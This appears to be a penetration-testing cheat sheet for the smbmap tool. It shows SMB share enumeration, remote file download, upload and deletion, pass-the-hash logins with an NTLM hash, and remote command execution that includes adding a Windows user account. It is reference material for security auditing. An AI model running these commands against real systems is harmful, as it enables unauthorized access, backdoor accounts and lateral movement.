
# SMBmap - SMB Enumeration Tool

`smbmap` is a command-line tool used to enumerate SMB shares, identify permissions, and perform file operations on remote systems.

It is commonly used in penetration testing and Windows network auditing.

# 🔹 Basic Syntax

```bash
smbmap -H <target-ip> [options]
```

---

# 🔹 Enumeration

# ✅ Anonymous Share Enumeration

```bash
smbmap -H 192.168.2.207
```

---

# ✅ Invalid User Check

```bash
smbmap -H 192.168.2.207 -u fakeuser
```

```bash
smbmap -H 192.168.2.207 -u aa
```

---

# ✅ Authenticated Enumeration

```bash
smbmap -H 192.168.2.207 -u administrator -p 'Anish@123'
```

---

# ✅ Domain Authentication

```bash
smbmap -H 192.168.2.207 -d DOMAIN -u user -p password
```

---

# 🔹 Share Enumeration

# ✅ List Shares

```bash
smbmap -H 192.168.2.207 -u user -p password
```

---

# ✅ Explicit Share Listing

```bash
smbmap -H 192.168.2.207 -u user -p password -L
```

---

# 🔹 Directory Enumeration

# ✅ Recursive Listing (All Shares)

```bash
smbmap -H 192.168.2.207 -u user -p password -r
```

---

# ✅ Recursive Listing (Specific Share)

```bash
smbmap -H 192.168.2.207 -u user -p password -r SHARE
```

```bash
smbmap -H 192.168.2.207 -u aaaa -r VulnShare
```

---

# ✅ Nested Directory Enumeration

```bash
smbmap -H 192.168.2.207 -u user -p password -r SHARE/folder
```

---

# 🔹 File Operations

# ✅ Download File

```bash
smbmap -H 192.168.2.207 -u user -p password --download SHARE/file.txt
```

```bash
smbmap -H 192.168.2.207 -u fakeuser --download VulnShare/1.jpg
```

---

# ✅ Upload File

```bash
smbmap -H 192.168.2.207 -u user -p password --upload local.txt SHARE/local.txt
```

```bash
smbmap -H 192.168.2.207 -u fakeuser --upload ../Documents/tesla_domain.txt VulnShare/local.txt
```

---

# ✅ Delete File

```bash
smbmap -H 192.168.2.207 -u user -p password --delete SHARE/file.txt
```

```bash
smbmap -H 192.168.2.207 -u fakeuser --delete VulnShare/local.txt
```

---

# ✅ Search File

```bash
smbmap -H 192.168.2.207 -u user -p password -r SHARE -A filename.txt
```

```bash
smbmap -H 192.168.2.207 -u aaa -r VulnShare -A filename.txt
```

---

# 🔹 Command Execution

# ✅ Execute Remote Command

```bash
smbmap -H 192.168.2.207 -u administrator -p password -x ipconfig
```

---

# ✅ Create User

```bash
smbmap -H 192.168.2.207 -u administrator -p password -x 'net user test Pass123 /add'
```

---

# ✅ List Users

```bash
smbmap -H 192.168.2.207 -u administrator -p password -x 'net user'
```

---

# 🔹 Pass-the-Hash (PTH)

# ✅ Authenticate Using NTLM Hash

```bash
smbmap -H 192.168.2.207 -u administrator -p 'LMHASH:NTHASH'
```

```bash
smbmap -H 192.168.2.207 -u administrator -p '31D6CFE0D16AE931B73C59D7E0C089C0:EF7FCEE5FEEF61AA827FE4D5E901A516'
```

---

# ✅ Recursive Listing with PTH

```bash
smbmap -H 192.168.2.207 -u user -p 'LMHASH:NTHASH' -r SHARE
```

```bash
smbmap -H 192.168.2.207 -u administrator -p '31D6CFE0D16AE931B73C59D7E0C089C0:EF7FCEE5FEEF61AA827FE4D5E901A516' -r VulnShare
```

# 🔹 Useful Options

| Option | Description |
| --- | --- |
| `-H` | Target IP |
| `-u` | Username |
| `-p` | Password / NTLM hash |
| `-d` | Domain |
| `-L` | List shares |
| `-r`, `-R` | Recursive listing |
| `-x` | Execute command |
| `--download` | Download file |
| `--upload` | Upload file |
| `--delete` | Delete file |
| `-A` | Search filename |
| `--debug` | Debug output |
| `--no-banner` | Hide banner |
| `-v` | Verbose mode |

---

# 🔹 Notes

- Anonymous access depends on SMB configuration.
- Command execution requires administrative privileges.
- Pass-the-Hash works only if NTLM authentication is enabled.
- Verify permissions before modifying files.

---

# 🔹 Common Use Cases

- SMB Share Enumeration
- Permission Auditing
- File Upload/Download
- Pass-the-Hash Authentication
- Remote Command Execution
- Windows Network Reconnaissance

---

# 🔹 Security Implications

Misconfigured SMB shares may expose:

- Sensitive files
- Writable directories
- Anonymous access
- Administrative shares

Attackers can leverage these weaknesses for:

- Lateral movement
- Credential harvesting
- Privilege escalation
- Remote code execution
